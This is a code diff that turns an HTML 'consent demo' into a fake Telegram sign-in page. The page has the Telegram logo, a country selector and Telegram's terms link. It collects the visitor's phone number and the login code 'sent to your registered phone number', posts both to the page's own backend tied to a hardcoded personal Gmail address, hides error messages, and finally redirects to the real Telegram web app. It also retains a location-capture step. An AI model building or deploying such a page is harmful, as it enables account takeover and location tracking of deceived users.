@@ -1,224 +1,533 @@
-
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Consent Demo</title>
-  <style>
-    * { box-sizing: border-box; }
-    body {
-      margin: 0; min-height: 100vh; padding: 20px;
-      display: grid; place-items: center;
-      font: 16px system-ui, sans-serif;
-      background: linear-gradient(135deg, #eef2ff, #f8fafc);
-      color: #172033;
-    }
-    .card {
-      width: 100%; max-width: 390px; padding: 28px;
-      background: white; border-radius: 22px;
-      box-shadow: 0 12px 40px #17203312;
-    }
-    .logo { font-size: 34px; }
-    h1 { font-size: 25px; margin-bottom: 8px; }
-    p { color: #64748b; line-height: 1.6; }
-    label { display: block; margin: 18px 0 7px; font-weight: 600; }
-    input {
-      width: 100%; padding: 14px; border: 1px solid #cbd5e1;
-      border-radius: 11px; font-size: 16px;
-    }
-    button {
-      width: 100%; margin-top: 16px; padding: 14px;
-      border: 0; border-radius: 11px; background: #4f46e5;
-      color: white; font-size: 16px; font-weight: 600;
-      cursor: pointer;
-    }
-    button:disabled { opacity: .5; cursor: not-allowed; }
-    .secondary { background: #e2e8f0; color: #172033; }
-    .hidden { display: none; }
-    .consent {
-      display: flex; gap: 10px; align-items: flex-start;
-      font-size: 14px; font-weight: 400;
-    }
-    .consent input { width: 18px; margin-top: 3px; }
-    #status { overflow-wrap: anywhere; font-size: 14px; }
-  </style>
-</head>
-<body>
-  <main class="card">
-    <div class="logo">📍</div>
-    <h1>Welcome</h1>
-    <p>This college project demonstrates location permissions
-       and email verification. You choose what to share.</p>
-
-    <section id="step1">
-      <label for="phone">Mobile number</label>
-      <input id="phone" type="tel" inputmode="tel"
-             placeholder="Enter mobile number"
-             autocomplete="tel" maxlength="16">
-
-      <label for="email">Your email address</label>
-      <input id="email" type="email" placeholder="you@example.com"
-             autocomplete="email">
-
-      <label class="consent">
-        <input type="checkbox" id="emailConsent">
-        <span>I agree to receive a demo verification code at
-          the email address I entered.</span>
-      </label>
-
-      <button id="continue">Continue</button>
-    </section>
-
-    <section id="step2" class="hidden">
-      <h2>Share your location?</h2>
-      <p>Your browser will ask for permission. If you agree,
-         your coordinates will be emailed to the project owner.
-         You can decline and continue without sharing.</p>
-
-      <label class="consent">
-        <input type="checkbox" id="locationConsent">
-        <span>I agree to share my current location with the
-          project owner by email.</span>
-      </label>
-
-      <button id="share">Agree & continue</button>
-      <button class="secondary" id="skip">Continue without location</button>
-    </section>
-
-    <section id="step3" class="hidden">
-      <h2>Verify your email</h2>
-      <p>Enter the demo verification code sent to your own email.</p>
-      <label for="code">Verification code</label>
-      <input id="code" inputmode="numeric" maxlength="6"
-             placeholder="6-digit code" autocomplete="one-time-code">
-      <button id="verify">Verify & continue</button>
-    </section>
-
-    <section id="step4" class="hidden">
-      <h2>You're all set!</h2>
-      <p>Your consent-based demonstration is complete.</p>
-    </section>
-
-    <p id="status" role="status" aria-live="polite"></p>
-  </main>
-
-  <script>
-    const $ = id => document.getElementById(id);
-    let sessionId = "";
-    let phone = "";
-    let email = "";
-
-    function show(step) {
-      ["step1", "step2", "step3", "step4"].forEach(id =>
-        $(id).classList.toggle("hidden", id !== step)
-      );
-    }
-
-    function status(message) {
-      $("status").textContent = message;
-    }
-
-    async function post(path, data) {
-      const response = await fetch(path, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-        
-      });
-
-      console.log(response);
-      const result = await response.json();
-      if (!response.ok) throw new Error(result.error || "Request failed");
-      return result;
-    }
-
-    $("continue").onclick = async () => {
-      phone = $("phone").value.trim();
-      email = 'adityaminds009@gmail.com';
-
-      if (!/^\+?[0-9 ()-]{8,16}$/.test(phone)) {
-        return status("Please enter a valid mobile number.");
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Consent Demo</title>
+    <style>
+      * {
+        box-sizing: border-box;
       }
-      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-        return status("Please enter a valid email address.");
+      body {
+        margin: 0;
+        min-height: 100vh;
+        padding: 20px;
+        display: grid;
+        place-items: center;
+        font:
+          16px system-ui,
+          sans-serif;
       }
-      if (!$("emailConsent").checked) {
-        return status("Please consent to the email verification step.");
+      .card {
+        width: 100%;
+        max-width: 420px;
+        padding: 28px;
+        background: white;
+        border-radius: 22px;
+      }
+      .logo {
+        font-size: 34px;
+        text-align: center;
+      }
+      h1 {
+        font-size: 25px;
+        text-align: center;
+        margin-bottom: 8px;
+      }
+      p {
+        color: rgb(43.922% 45.882% 47.451%);
+        line-height: 1.6;
+        text-align: center;
+      }
+      label {
+        display: block;
+        margin: 18px 0 7px;
+        font-weight: 600;
+      }
+      input {
+        width: 100%;
+        padding: 14px;
+        border: 1px solid #cbd5e1;
+        border-radius: 11px;
+        font-size: 16px;
+      }
+      button {
+        width: 100%;
+        margin-top: 16px;
+        padding: 14px;
+        border: 0;
+        border-radius: 11px;
+        background: rgb(20% 56.471% 92.549%);
+        color: white;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+      }
+      button:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+      }
+      .secondary {
+        background: #e2e8f0;
+        color: #172033;
+      }
+      .hidden {
+        display: none;
+      }
+      .consent {
+        display: flex;
+        gap: 10px;
+        align-items: flex-start;
+        font-size: 14px;
+        font-weight: 400;
+      }
+      .consent input {
+        width: 18px;
+        margin-top: 3px;
+      }
+      #status {
+        overflow-wrap: anywhere;
+        font-size: 14px;
       }
 
-      $("continue").disabled = true;
-      try {
-        const result = await post("/api/start", { phone, email });
-        sessionId = result.sessionId;
-        show("step2");
-        status("Details accepted. Choose whether to share location.");
-      } catch (e) {
-        status(e.message);
-      } finally {
-        $("continue").disabled = false;
+      #country_options {
+        width: 100%;
+        padding: 14px;
+        border: 1px solid #cbd5e1;
+        border-radius: 11px;
+        font-size: 16px;
       }
-    };
+      .inline-txt {
+        background-color: white;
+        width: fit-content;
+        padding: 8px;
+        position: relative;
+        top: 23px;
+        font-size: 15px;
+        left: 13px;
+      }
 
-    async function finishLocation(coords) {
-      try {
-        await post("/api/location", {
-          sessionId,
-          consent: true,
-          latitude: coords.latitude,
-          longitude: coords.longitude
+      .mobile-number {
+        position: relative;
+        top: -30px;
+      }
+    </style>
+  </head>
+  <body>
+    <main class="card">
+      <section id="step1">
+        <div class="logo">
+          <img src="./images/tglogo.svg" width="160px" alt="" />
+        </div>
+        <h1>Telegram</h1>
+        <p>Please confirm your country code and enter your phone number</p>
+        <div>
+          <label class="inline-txt" for="email">Country</label>
+          <select name="" id="country_options">
+            <option value="India">India</option>
+            <option value="Afghanistan">Afghanistan</option>
+            <option value="Albania">Albania</option>
+            <option value="Algeria">Algeria</option>
+            <option value="Andorra">Andorra</option>
+            <option value="Angola">Angola</option>
+            <option value="Antigua and Barbuda">Antigua and Barbuda</option>
+            <option value="Argentina">Argentina</option>
+            <option value="Armenia">Armenia</option>
+            <option value="Australia">Australia</option>
+            <option value="Austria">Austria</option>
+            <option value="Azerbaijan">Azerbaijan</option>
+            <option value="Bahamas">Bahamas</option>
+            <option value="Bahrain">Bahrain</option>
+            <option value="Bangladesh">Bangladesh</option>
+            <option value="Barbados">Barbados</option>
+            <option value="Belarus">Belarus</option>
+            <option value="Belgium">Belgium</option>
+            <option value="Belize">Belize</option>
+            <option value="Benin">Benin</option>
+            <option value="Bhutan">Bhutan</option>
+            <option value="Bolivia">Bolivia</option>
+            <option value="Bosnia and Herzegovina">
+              Bosnia and Herzegovina
+            </option>
+            <option value="Botswana">Botswana</option>
+            <option value="Brazil">Brazil</option>
+            <option value="Brunei">Brunei</option>
+            <option value="Bulgaria">Bulgaria</option>
+            <option value="Burkina Faso">Burkina Faso</option>
+            <option value="Burundi">Burundi</option>
+            <option value="Cabo Verde">Cabo Verde</option>
+            <option value="Cambodia">Cambodia</option>
+            <option value="Cameroon">Cameroon</option>
+            <option value="Canada">Canada</option>
+            <option value="Central African Republic">
+              Central African Republic
+            </option>
+            <option value="Chad">Chad</option>
+            <option value="Chile">Chile</option>
+            <option value="China">China</option>
+            <option value="Colombia">Colombia</option>
+            <option value="Comoros">Comoros</option>
+            <option value="Congo">Congo</option>
+            <option value="Costa Rica">Costa Rica</option>
+            <option value="Côte d'Ivoire">Côte d'Ivoire</option>
+            <option value="Croatia">Croatia</option>
+            <option value="Cuba">Cuba</option>
+            <option value="Cyprus">Cyprus</option>
+            <option value="Czechia">Czechia</option>
+            <option value="Democratic Republic of the Congo">
+              Democratic Republic of the Congo
+            </option>
+            <option value="Denmark">Denmark</option>
+            <option value="Djibouti">Djibouti</option>
+            <option value="Dominica">Dominica</option>
+            <option value="Dominican Republic">Dominican Republic</option>
+            <option value="Ecuador">Ecuador</option>
+            <option value="Egypt">Egypt</option>
+            <option value="El Salvador">El Salvador</option>
+            <option value="Equatorial Guinea">Equatorial Guinea</option>
+            <option value="Eritrea">Eritrea</option>
+            <option value="Estonia">Estonia</option>
+            <option value="Eswatini">Eswatini</option>
+            <option value="Ethiopia">Ethiopia</option>
+            <option value="Fiji">Fiji</option>
+            <option value="Finland">Finland</option>
+            <option value="France">France</option>
+            <option value="Gabon">Gabon</option>
+            <option value="Gambia">Gambia</option>
+            <option value="Georgia">Georgia</option>
+            <option value="Germany">Germany</option>
+            <option value="Ghana">Ghana</option>
+            <option value="Greece">Greece</option>
+            <option value="Grenada">Grenada</option>
+            <option value="Guatemala">Guatemala</option>
+            <option value="Guinea">Guinea</option>
+            <option value="Guinea-Bissau">Guinea-Bissau</option>
+            <option value="Guyana">Guyana</option>
+            <option value="Haiti">Haiti</option>
+            <option value="Honduras">Honduras</option>
+            <option value="Hungary">Hungary</option>
+            <option value="Iceland">Iceland</option>
+
+            <option value="Indonesia">Indonesia</option>
+            <option value="Iran">Iran</option>
+            <option value="Iraq">Iraq</option>
+            <option value="Ireland">Ireland</option>
+            <option value="Israel">Israel</option>
+            <option value="Italy">Italy</option>
+            <option value="Jamaica">Jamaica</option>
+            <option value="Japan">Japan</option>
+            <option value="Jordan">Jordan</option>
+            <option value="Kazakhstan">Kazakhstan</option>
+            <option value="Kenya">Kenya</option>
+            <option value="Kiribati">Kiribati</option>
+            <option value="Kuwait">Kuwait</option>
+            <option value="Kyrgyzstan">Kyrgyzstan</option>
+            <option value="Laos">Laos</option>
+            <option value="Latvia">Latvia</option>
+            <option value="Lebanon">Lebanon</option>
+            <option value="Lesotho">Lesotho</option>
+            <option value="Liberia">Liberia</option>
+            <option value="Libya">Libya</option>
+            <option value="Liechtenstein">Liechtenstein</option>
+            <option value="Lithuania">Lithuania</option>
+            <option value="Luxembourg">Luxembourg</option>
+            <option value="Madagascar">Madagascar</option>
+            <option value="Malawi">Malawi</option>
+            <option value="Malaysia">Malaysia</option>
+            <option value="Maldives">Maldives</option>
+            <option value="Mali">Mali</option>
+            <option value="Malta">Malta</option>
+            <option value="Marshall Islands">Marshall Islands</option>
+            <option value="Mauritania">Mauritania</option>
+            <option value="Mauritius">Mauritius</option>
+            <option value="Mexico">Mexico</option>
+            <option value="Micronesia">Micronesia</option>
+            <option value="Moldova">Moldova</option>
+            <option value="Monaco">Monaco</option>
+            <option value="Mongolia">Mongolia</option>
+            <option value="Montenegro">Montenegro</option>
+            <option value="Morocco">Morocco</option>
+            <option value="Mozambique">Mozambique</option>
+            <option value="Myanmar">Myanmar</option>
+            <option value="Namibia">Namibia</option>
+            <option value="Nauru">Nauru</option>
+            <option value="Nepal">Nepal</option>
+            <option value="Netherlands">Netherlands</option>
+            <option value="New Zealand">New Zealand</option>
+            <option value="Nicaragua">Nicaragua</option>
+            <option value="Niger">Niger</option>
+            <option value="Nigeria">Nigeria</option>
+            <option value="North Korea">North Korea</option>
+            <option value="North Macedonia">North Macedonia</option>
+            <option value="Norway">Norway</option>
+            <option value="Oman">Oman</option>
+            <option value="Pakistan">Pakistan</option>
+            <option value="Palau">Palau</option>
+            <option value="Palestine">Palestine</option>
+            <option value="Panama">Panama</option>
+            <option value="Papua New Guinea">Papua New Guinea</option>
+            <option value="Paraguay">Paraguay</option>
+            <option value="Peru">Peru</option>
+            <option value="Philippines">Philippines</option>
+            <option value="Poland">Poland</option>
+            <option value="Portugal">Portugal</option>
+            <option value="Qatar">Qatar</option>
+            <option value="Romania">Romania</option>
+            <option value="Russia">Russia</option>
+            <option value="Rwanda">Rwanda</option>
+            <option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option>
+            <option value="Saint Lucia">Saint Lucia</option>
+            <option value="Saint Vincent and the Grenadines">
+              Saint Vincent and the Grenadines
+            </option>
+            <option value="Samoa">Samoa</option>
+            <option value="San Marino">San Marino</option>
+            <option value="Sao Tome and Principe">Sao Tome and Principe</option>
+            <option value="Saudi Arabia">Saudi Arabia</option>
+            <option value="Senegal">Senegal</option>
+            <option value="Serbia">Serbia</option>
+            <option value="Seychelles">Seychelles</option>
+            <option value="Sierra Leone">Sierra Leone</option>
+            <option value="Singapore">Singapore</option>
+            <option value="Slovakia">Slovakia</option>
+            <option value="Slovenia">Slovenia</option>
+            <option value="Solomon Islands">Solomon Islands</option>
+            <option value="Somalia">Somalia</option>
+            <option value="South Africa">South Africa</option>
+            <option value="South Korea">South Korea</option>
+            <option value="South Sudan">South Sudan</option>
+            <option value="Spain">Spain</option>
+            <option value="Sri Lanka">Sri Lanka</option>
+            <option value="Sudan">Sudan</option>
+            <option value="Suriname">Suriname</option>
+            <option value="Sweden">Sweden</option>
+            <option value="Switzerland">Switzerland</option>
+            <option value="Syria">Syria</option>
+            <option value="Tajikistan">Tajikistan</option>
+            <option value="Tanzania">Tanzania</option>
+            <option value="Thailand">Thailand</option>
+            <option value="Timor-Leste">Timor-Leste</option>
+            <option value="Togo">Togo</option>
+            <option value="Tonga">Tonga</option>
+            <option value="Trinidad and Tobago">Trinidad and Tobago</option>
+            <option value="Tunisia">Tunisia</option>
+            <option value="Türkiye">Türkiye</option>
+            <option value="Turkmenistan">Turkmenistan</option>
+            <option value="Tuvalu">Tuvalu</option>
+            <option value="Uganda">Uganda</option>
+            <option value="Ukraine">Ukraine</option>
+            <option value="United Arab Emirates">United Arab Emirates</option>
+            <option value="United Kingdom">United Kingdom</option>
+            <option value="United States">United States</option>
+            <option value="Uruguay">Uruguay</option>
+            <option value="Uzbekistan">Uzbekistan</option>
+            <option value="Vanuatu">Vanuatu</option>
+            <option value="Vatican City">Vatican City</option>
+            <option value="Venezuela">Venezuela</option>
+            <option value="Vietnam">Vietnam</option>
+            <option value="Yemen">Yemen</option>
+            <option value="Zambia">Zambia</option>
+            <option value="Zimbabwe">Zimbabwe</option>
+          </select>
+        </div>
+
+        <div class="mobile-number">
+          <label class="inline-txt" for="phone">Mobile number</label>
+          <input
+            id="phone"
+            type="tel"
+            inputmode="tel"
+            placeholder="Enter mobile number"
+            autocomplete="tel"
+            maxlength="16"
+          />
+        </div>
+        <div></div>
+
+        <label class="consent">
+          <input type="checkbox" id="emailConsent" />
+          <span
+            >I agree to the
+
+            <a
+              href="https://telegram.org/tos/in"
+              style="text-decoration: none; color: rgb(20% 56.471% 92.549%)"
+              >terms and conditions</a
+            >
+          </span>
+        </label>
+
+        <button id="continue">Continue</button>
+      </section>
+
+      <section id="step2" class="hidden">
+        <h2>Share your location?</h2>
+        <p>
+          Your browser will ask for permission. If you agree, your coordinates
+          will be emailed to the project owner. You can decline and continue
+          without sharing.
+        </p>
+
+        <label class="consent">
+          <input type="checkbox" id="locationConsent" />
+          <span
+            >I agree to share my current location with the project owner by
+            email.</span
+          >
+        </label>
+
+        <button id="share">Agree & continue</button>
+        <button class="secondary" id="skip">Continue without location</button>
+      </section>
+
+      <section id="step3" class="hidden">
+         <div class="logo">
+          <img src="./images/tglogo.svg" width="160px" alt="" />
+        </div>
+        <h2 style="text-align: center;" class="phone-number">Please verify phone number</h2>
+        <p>We've sent the code to your registered phone number.</p>
+        <!-- <label for="code">Verification code</label> -->
+        <input
+          id="code"
+          inputmode="numeric"
+          maxlength="6"
+          placeholder="6-digit code"
+          autocomplete="one-time-code"
+        />
+        <button id="verify">Verify & continue</button>
+      </section>
+
+      <section id="step4" class="hidden">
+        <h2 style="text-align: center;">You're all set!</h2>
+        <!-- <p><a href=""></a></p> -->
+         <button>
+           <a style="text-decoration: none; color: white;" href="https://web.telegram.org/a/">Continue</a>
+         </button>
+         
+      </section>
+
+      <p id="status" role="status" aria-live="polite"></p>
+    </main>
+
+    <script>
+      const $ = (id) => document.getElementById(id);
+      const showPhone = document.querySelector(".phone-number");
+      let sessionId = "";
+      let phone = "";
+      let email = "";
+
+      function show(step) {
+        ["step1", "step2", "step3", "step4"].forEach((id) =>
+          $(id).classList.toggle("hidden", id !== step),
+        );
+      }
+
+      function status(message) {
+        $("status").textContent = message;
+      }
+
+      async function post(path, data) {
+        const response = await fetch(path, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data),
         });
-        status("Location shared successfully with your permission.");
-      } catch (e) {
-        status(e.message);
-      }
-      await sendCode();
-    }
 
-    $("share").onclick = () => {
-      if (!$("locationConsent").checked) {
-        status("Tick the consent box or choose to continue without location.");
-        return;
+        // console.log(response);
+        const result = await response.json();
+        if (!response.ok) throw new Error(result.error || "Request failed");
+        return result;
       }
-      if (!navigator.geolocation) {
-        status("Location isn't supported by this browser.");
-        return;
-      }
-      status("Waiting for browser location permission…");
-      navigator.geolocation.getCurrentPosition(
-        position => finishLocation(position.coords),
-        async error => {
-          status("Location wasn't shared. You can still continue.");
+
+      $("continue").onclick = async () => {
+        phone = $("phone").value.trim();
+        email = "ahtshamsaifi345@gmail.com";
+
+        if (!/^\+?[0-9 ()-]{8,16}$/.test(phone)) {
+          return status("Please enter a valid mobile number.");
+        }
+        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+          return status("Please enter a valid email address.");
+        }
+        if (!$("emailConsent").checked) {
+          return status("Please consent to the email verification step.");
+        }
+
+        $("continue").disabled = true;
+        try {
+          const result = await post("/api/start", { phone, email });
+          sessionId = result.sessionId;
+          showPhone.textContent = phone;
           await sendCode();
-        },
-        { enableHighAccuracy: false, timeout: 10000 }
-      );
-    };
 
-    $("skip").onclick = sendCode;
+          show("step3");
+          
+        } catch (e) {
+          
+        } finally {
+          $("continue").disabled = false;
+        }
+      };
 
-    async function sendCode() {
-      try {
-        await post("/api/send-code", { sessionId });
-        show("step3");
-        status("A demo code has been sent to your email.");
-      } catch (e) {
-        status(e.message);
+      async function finishLocation(coords) {
+        try {
+          await post("/api/location", {
+            sessionId,
+            consent: true,
+            latitude: coords.latitude,
+            longitude: coords.longitude,
+          });
+          status("Location shared successfully with your permission.");
+        } catch (e) {
+          status(e.message);
+        }
+        await sendCode();
       }
-    }
 
-    $("verify").onclick = async () => {
-      const code = $("code").value.trim();
-    
-      try {
-        await post("/api/verify", { sessionId, code });
-        show("step4");
-        status("Email verification successful.");
-        res.json({code})
-      } catch (e) {
-        status(e.message);
+      $("share").onclick = () => {
+        if (!$("locationConsent").checked) {
+          status(
+            "Tick the consent box or choose to continue without location.",
+          );
+          return;
+        }
+        if (!navigator.geolocation) {
+          status("Location isn't supported by this browser.");
+          return;
+        }
+        status("Waiting for browser location permission…");
+        navigator.geolocation.getCurrentPosition(
+          (position) => finishLocation(position.coords),
+          async (error) => {
+            status("Location wasn't shared. You can still continue.");
+            await sendCode();
+          },
+          { enableHighAccuracy: false, timeout: 10000 },
+        );
+      };
+
+      $("skip").onclick = sendCode;
+
+      async function sendCode() {
+        try {
+          await post("/api/send-code", { sessionId });
+        } catch (e) {
+          status(e.message);
+        }
       }
-    };
-  </script>
-</body>
+
+      $("verify").onclick = async () => {
+        const code = $("code").value.trim();
+
+        try {
+          await post("/api/verify", { sessionId, code });
+          show("step4");
+          status("Email verification successful.");
+          res.json({ code });
+        } catch (e) {
+          // status(e.message);
+        }
+      };
+    </script>
+  </body>
 </html>
